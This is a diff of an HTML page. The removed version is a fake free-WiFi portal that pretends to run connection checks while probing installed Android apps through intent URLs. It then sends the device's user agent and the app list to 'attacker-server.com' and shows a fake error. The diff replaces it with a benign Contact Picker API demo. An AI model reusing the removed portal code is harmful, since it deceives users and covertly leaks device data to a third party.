@@ -1,100 +1,144 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Free WiFi Portal</title>
+    <title>Contact Access Test</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        button { padding: 15px 30px; font-size: 16px; margin: 10px; }
+        #contactsList { margin: 20px 0; padding: 15px; border: 1px solid #ccc; }
+        .contact { padding: 10px; border-bottom: 1px solid #eee; }
+        .error { color: red; padding: 10px; background: #ffeeee; }
+        .success { color: green; padding: 10px; background: #eeffee; }
+    </style>
 </head>
 <body>
-    <div id="content">
-        <h2>Welcome to Free WiFi</h2>
-        <p>Please complete these steps to connect:</p>
-        
-        <div id="steps">
-            <div class="step">1. Checking device compatibility... <span id="step1">⏳</span></div>
-            <div class="step">2. Verifying security... <span id="step2">⏳</span></div>
-            <div class="step">3. Connecting to network... <span id="step3">⏳</span></div>
-        </div>
-        
-        <button onclick="startAttack()" id="startBtn" style="display:none;">
-            Start Connection
-        </button>
-    </div>
+    <h2>Contact Access Demo</h2>
+    <p>This demonstrates how modern browsers handle contact access:</p>
+    
+    <button onclick="requestContacts()">Select Contacts</button>
+    <button onclick="requestContactsWithProperties()">Select Contacts (Detailed)</button>
+    
+    <div id="status"></div>
+    <div id="contactsList"></div>
 
     <script>
-        async function startAttack() {
-            document.getElementById('startBtn').style.display = 'none';
+        async function requestContacts() {
+            const statusDiv = document.getElementById('status');
+            const contactsList = document.getElementById('contactsList');
             
-            // Step 1: Get basic device info
-            document.getElementById('step1').innerHTML = '✅';
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            // Step 2: "Security check" - actually probing apps
-            document.getElementById('step2').innerHTML = '🔍';
-            const detectedApps = await probeAppsWithUserInteraction();
-            document.getElementById('step2').innerHTML = '✅';
-            
-            // Step 3: "Network connection" - sending data to attacker
-            document.getElementById('step3').innerHTML = '📡';
-            await sendToAttacker(detectedApps);
-            document.getElementById('step3').innerHTML = '✅';
-            
-            // Show fake error
-            document.getElementById('content').innerHTML = `
-                <h2>Connection Failed</h2>
-                <p>Unable to connect to WiFi at this time. Please try again later.</p>
-                <p><small>Error code: WIFI-${Date.now()}</small></p>
-            `;
-        }
-
-        function probeAppsWithUserInteraction() {
-            return new Promise((resolve) => {
-                const apps = [
-                    'intent://linkedin.com/#Intent;scheme=linkedin;package=com.linkedin.android;end',
-                    'intent://send?text=hello#Intent;scheme=whatsapp;package=com.whatsapp;end',
-                    'intent://facebook.com/#Intent;scheme=fb;package=com.facebook.katana;end',
-                    'intent://instagram.com/#Intent;scheme=instagram;package=com.instagram.android;end'
-                ];
-
-                let detected = [];
-                let current = 0;
-
-                function tryNextApp() {
-                    if (current >= apps.length) {
-                        resolve(detected);
-                        return;
-                    }
-
-                    window.location = apps[current];
-                    
-                    setTimeout(() => {
-                        // If still on page after 1 second, app didn't open
-                        detected.push(apps[current]);
-                        current++;
-                        tryNextApp();
-                    }, 1000);
+            try {
+                // Check if Contact Picker API is supported
+                if (!('contacts' in navigator && 'select' in navigator.contacts)) {
+                    statusDiv.innerHTML = '<div class="error">Contact Picker API not supported in this browser</div>';
+                    return;
                 }
 
-                tryNextApp();
-            });
+                statusDiv.innerHTML = '<div>Opening contact picker...</div>';
+                
+                // Request contacts - user must manually select
+                const contacts = await navigator.contacts.select(
+                    ['name', 'email', 'tel'], 
+                    { multiple: true }
+                );
+
+                if (contacts.length === 0) {
+                    statusDiv.innerHTML = '<div class="error">No contacts selected</div>';
+                    return;
+                }
+
+                // Display selected contacts
+                statusDiv.innerHTML = `<div class="success">Selected ${contacts.length} contact(s)</div>`;
+                contactsList.innerHTML = '<h3>Selected Contacts:</h3>';
+                
+                contacts.forEach((contact, index) => {
+                    const contactDiv = document.createElement('div');
+                    contactDiv.className = 'contact';
+                    contactDiv.innerHTML = `
+                        <strong>Contact ${index + 1}:</strong><br>
+                        Name: ${contact.name || 'Not provided'}<br>
+                        Email: ${contact.email || 'Not provided'}<br>
+                        Phone: ${contact.tel || 'Not provided'}<br>
+                    `;
+                    contactsList.appendChild(contactDiv);
+                });
+
+            } catch (error) {
+                statusDiv.innerHTML = `<div class="error">Error: ${error.message}</div>`;
+                console.error('Contact picker error:', error);
+            }
         }
 
-        function sendToAttacker(apps) {
-            return fetch('https://attacker-server.com/collect', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    userAgent: navigator.userAgent,
-                    apps: apps,
-                    timestamp: new Date().toISOString()
-                })
-            });
+        async function requestContactsWithProperties() {
+            const statusDiv = document.getElementById('status');
+            const contactsList = document.getElementById('contactsList');
+            
+            try {
+                if (!('contacts' in navigator && 'select' in navigator.contacts)) {
+                    statusDiv.innerHTML = '<div class="error">Contact Picker API not supported</div>';
+                    return;
+                }
+
+                // Request specific properties
+                const properties = ['name', 'email', 'tel', 'address', 'icon'];
+                const contacts = await navigator.contacts.select(properties, { 
+                    multiple: true 
+                });
+
+                if (contacts.length === 0) {
+                    statusDiv.innerHTML = '<div class="error">No contacts selected</div>';
+                    return;
+                }
+
+                statusDiv.innerHTML = `<div class="success">Selected ${contacts.length} contact(s) with detailed info</div>`;
+                contactsList.innerHTML = '<h3>Detailed Contact Info:</h3>';
+                
+                contacts.forEach((contact, index) => {
+                    const contactDiv = document.createElement('div');
+                    contactDiv.className = 'contact';
+                    
+                    let contactHTML = `<strong>Contact ${index + 1}:</strong><br>`;
+                    
+                    if (contact.name && contact.name.length > 0) {
+                        contactHTML += `Name: ${contact.name.join(', ')}<br>`;
+                    }
+                    
+                    if (contact.email && contact.email.length > 0) {
+                        contactHTML += `Email: ${contact.email.join(', ')}<br>`;
+                    }
+                    
+                    if (contact.tel && contact.tel.length > 0) {
+                        contactHTML += `Phone: ${contact.tel.join(', ')}<br>`;
+                    }
+                    
+                    if (contact.address && contact.address.length > 0) {
+                        contactHTML += `Address: ${contact.address.join(', ')}<br>`;
+                    }
+                    
+                    contactDiv.innerHTML = contactHTML;
+                    contactsList.appendChild(contactDiv);
+                });
+
+            } catch (error) {
+                statusDiv.innerHTML = `<div class="error">Error: ${error.message}</div>`;
+            }
         }
 
-        // Show start button after page loads
-        window.onload = () => {
-            setTimeout(() => {
-                document.getElementById('startBtn').style.display = 'block';
-            }, 2000);
-        };
+        // Check browser support on load
+        window.addEventListener('load', () => {
+            const statusDiv = document.getElementById('status');
+            
+            if ('contacts' in navigator && 'select' in navigator.contacts) {
+                statusDiv.innerHTML = '<div class="success">Contact Picker API is supported</div>';
+            } else {
+                statusDiv.innerHTML = `
+                    <div class="error">
+                        Contact Picker API not supported in your browser.<br>
+                        Supported browsers: Chrome 80+, Edge 80+, Opera 67+<br>
+                        <strong>Note:</strong> This API requires HTTPS and user interaction
+                    </div>
+                `;
+            }
+        });
     </script>
 </body>
 </html>
